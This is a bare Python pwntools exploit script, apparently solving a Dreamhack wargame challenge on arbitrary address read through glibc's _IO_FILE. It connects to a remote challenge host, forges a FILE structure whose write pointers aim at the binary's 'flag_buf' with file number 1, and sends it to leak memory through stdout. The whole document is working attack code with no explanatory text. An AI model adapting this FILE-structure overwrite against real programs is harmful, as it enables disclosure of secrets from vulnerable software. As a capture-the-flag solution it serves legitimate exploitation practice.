from pwn import *

port = 11229
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/_IO_FILE Arbitrary Address Read/problem/iofile_aar")

flag_buf = elf.symbols['flag_buf']

payload = p64(0xfbad0000 | 0x800)
payload += p64(0) # _IO_read_ptr
payload += p64(flag_buf) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(flag_buf) # _IO_write_base
payload += p64(flag_buf + 1024) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(1) # stdout

rem.sendlineafter(b'Data: ', payload)

print(rem.recvline().rstrip())